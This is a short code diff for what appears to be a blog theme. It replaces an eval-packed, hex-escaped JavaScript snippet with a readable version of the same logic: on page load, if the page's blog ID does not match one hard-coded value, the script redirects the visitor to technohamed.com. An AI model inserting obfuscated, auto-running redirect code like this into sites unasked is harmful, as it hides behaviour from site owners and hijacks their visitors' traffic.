@@ -1,1 +1,7 @@
-eval(function(p,a,c,k,e,d){e=function(c){return(c&#x3C;a?&#x27;&#x27;:e(parseInt(c/a)))+((c=c%a)&#x3E;35?String.fromCharCode(c+29):c.toString(36))};if(!&#x27;&#x27;.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return&#x27;\\w+&#x27;};c=1};while(c--){if(k[c]){p=p.replace(new RegExp(&#x27;\\b&#x27;+e(c)+&#x27;\\b&#x27;,&#x27;g&#x27;),k[c])}}return p}(&#x27;n a=[&#x22;\\w\\l\\b\\x\\y\\u&#x22;,&#x22;\\e\\c\\c\\h&#x22;,&#x22;\\B\\w\\l\\b\\x\\y\\u&#x22;,&#x22;\\j\\A\\o\\g\\o\\g\\g\\k\\j\\r\\q\\D\\k\\r\\k\\j\\q\\p\\p&#x22;,&#x22;\\f\\h\\d\\C&#x22;,&#x22;\\l\\b\\m\\e\\c\\M\\b\\s&#x22;,&#x22;\\f\\c\\c\\E\\L\\K\\i\\i\\c\\d\\m\\f\\s\\b\\f\\e\\t\\d\\v\\J\\m\\b\\t\\i&#x22;,&#x22;\\h\\d\\e\\v\\H&#x22;];n 8=[a[0],a[1],a[2],a[3],a[4],a[5],a[6],a[7]];n 9=[8[0],8[1],8[2],8[3],8[4],8[5],8[6],8[7]];$(G)[9[7]](F(){I($(9[2])[9[1]](9[0])!=9[3]){z[9[5]][9[4]]=9[6]}})&#x27;,49,49,&#x27;||||||||_0xcaa1|_0x2890|_0xa6ff|x6F|x74|x65|x61|x68|x35|x72|x2F|x34|x31|x6C|x63|var|x37|x39|x38|x33|x6E|x6D|x44|x64|x62|x67|x49|window|x36|x23|x66|x32|x70|function|document|x79|if|x2E|x3A|x73|x69&#x27;.split(&#x27;|&#x27;),0,{}))
+$(document).ready(function()
+{
+   if($("#blogID").attr("blogID")!="4675755143821314899" )
+ {
+   window.location.href="https://technohamed.com/";
+ }
+    });
